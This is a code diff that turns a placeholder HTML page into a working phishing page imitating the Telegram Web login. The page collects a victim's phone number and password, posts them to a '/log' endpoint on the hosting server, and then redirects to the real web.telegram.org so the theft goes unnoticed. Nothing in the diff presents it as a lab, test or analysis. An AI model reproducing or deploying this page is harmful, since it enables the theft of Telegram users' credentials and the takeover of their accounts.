@@ -1,9 +1,39 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Telegram login</title>
-  </head>
-  <body>
-    <h1>О, Смотрите кто пришёл! Это же ты!</h1>
-  </body>
+<head>
+    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial, sans-serif; background: #0088cc; color: white; text-align: center; padding: 50px; }
+        .login-form { background: white; padding: 20px; border-radius: 10px; color: black; width: 300px; margin: 0 auto; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #0088cc; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Telegram</h1>
+    <div class="login-form">
+        <input type="tel" id="phone" placeholder="Номер телефона" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button onclick="sendData()">Войти</button>
+    </div>
+
+    <script>
+        function sendData() {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                window.location.href = 'https://web.telegram.org/'; // редирект на настоящий Telegram
+            })
+            .catch(error => console.error('Ошибка:', error));
+        }
+    </script>
+</body>
 </html>
